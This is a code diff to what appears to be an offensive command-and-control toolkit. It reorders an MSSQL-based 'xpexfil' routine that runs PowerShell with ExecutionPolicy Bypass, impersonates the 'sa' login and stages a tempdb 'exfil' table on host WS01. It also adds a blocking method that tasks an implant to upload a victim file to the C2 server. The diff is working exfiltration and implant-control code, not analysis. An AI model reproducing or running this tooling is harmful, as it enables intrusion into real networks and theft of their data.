@@ -336,13 +336,13 @@ class XpMssql:
         extract_ps = self._build_exfil_extract_ps(local_tmp, key_b64)
         shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
 
-        print(f"[*] xpexfil: pulling {local_name} from WS01 ...")
-        shell.cmd_get(local_tmp)
-
+        # D — cleanup DB (no WS01 dep), then pull file (blocking), then del WS01 temp
         self._exec_q(shell,
             "EXECUTE AS LOGIN='sa';"
             "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
         )
+        print(f"[*] xpexfil: pulling {local_name} from WS01 ...")
+        shell.cmd_get_wait(local_tmp)
         shell.cmd_exec_raw(f"cmd /c del /f {local_tmp}")
         print(f"[+] xpexfil done → {local_name}")
 
@@ -464,6 +464,16 @@ class ToneShellShell:
         task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")
+
+    def cmd_get_wait(self, remote_path: str):
+        """Pull a file FROM the implant to the C2 server upload dir, block until complete."""
+        if self.debug:
+            print(f"[DBG] GET-W → implant:{remote_path} → C2 uploads/  (blocking)")
+        task_num = self._next_task_num()
+        task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
+        info     = self._post_task(task)
+        print(f"[*] file-get task {info[TASK_GUID_KEY]} queued, waiting for upload …")
+        self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
 
     def cmd_put_wait(self, payload_name: str, remote_dest: str):
         """Push a file to the implant and block until transfer is complete."""
